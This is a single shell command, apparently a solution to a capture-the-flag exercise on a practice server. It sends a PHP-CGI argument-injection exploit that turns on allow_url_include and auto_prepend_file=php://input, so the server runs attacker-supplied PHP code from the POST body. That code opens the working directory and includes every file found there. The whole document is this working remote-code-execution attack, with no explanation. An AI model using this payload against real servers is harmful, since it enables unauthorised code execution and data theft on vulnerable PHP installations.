curl -v -X POST 'http://ctfq.sweetduet.info:10080/\~q12/index.php\?-d+allow_url_include%3dOn+-d+auto_prepend_file%3dphp://input' \
	-d '<?php $dir = "./"; if( is_dir( $dir ) && $handle = opendir( $dir ) ) { while( ($file = readdir($handle)) !== false ) { if( filetype( $path = $dir . $file ) == "file" ) { require $path ;}}} ?>'
